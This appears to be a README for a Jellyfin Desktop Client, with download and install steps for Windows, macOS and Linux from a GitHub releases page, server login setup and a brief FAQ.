## üíª Installation Steps

1. **Visit the Releases Page**  
   Click this [link](https://github.com/aco365/jellyfin-desktop/releases) to access our Releases page.

2. **Choose the Right File**  
   On the Releases page, find the most recent version of the Jellyfin Desktop Client. Look for files titled:
   - `jellyfin-desktop-setup.exe` for Windows
   - `jellyfin-desktop.dmg` for macOS
   - `jellyfin-desktop.AppImage` for Linux
   
3. **Download the File**  
   Click on the file name to start downloading. Wait for the download to complete.

4. **Run the Installer**  
   - For Windows: Locate the downloaded `jellyfin-desktop-setup.exe` file. Double-click it to run the installation.
   - For macOS: Open the downloaded `.dmg` file. Drag the Jellyfin Desktop Client icon to your Applications folder.
   - For Linux: Make the `jellyfin-desktop.AppImage` file executable by running `chmod +x jellyfin-desktop.AppImage` in your terminal, then run it with `./jellyfin-desktop.AppImage`.
   
5. **Follow On-Screen Instructions**  
   The installer will guide you through the installation process. Simply follow the prompts.

## üåê Setting Up the Client

1. **Open the Application**  
   After the installation, open the Jellyfin Desktop Client from your applications menu or desktop shortcut.

2. **Enter Your Server URL**  
   You will need to provide the URL of your Jellyfin server. It usually looks something like `http://yourserver:8096`.

3. **Login**  
   Enter your Jellyfin username and password. Click "Login" to access your media library.

4. **Explore Your Media**  
   Once logged in, you can browse your movies, shows, and other media easily.

## üìå Frequently Asked Questions

### How do I update my Jellyfin Desktop Client?

To update, return to the [Releases page](https://github.com/aco365/jellyfin-desktop/releases) and download the latest version. Follow the same installation steps as before.

### Can I use Jellyfin Desktop on multiple devices?

Yes, you can install the Jellyfin Desktop Client on multiple devices. Just ensure that each device meets the system requirements.

### Is my media safe?

Yes, your media remains secure on your Jellyfin server. The Jellyfin Desktop Client simply accesses it via the network.
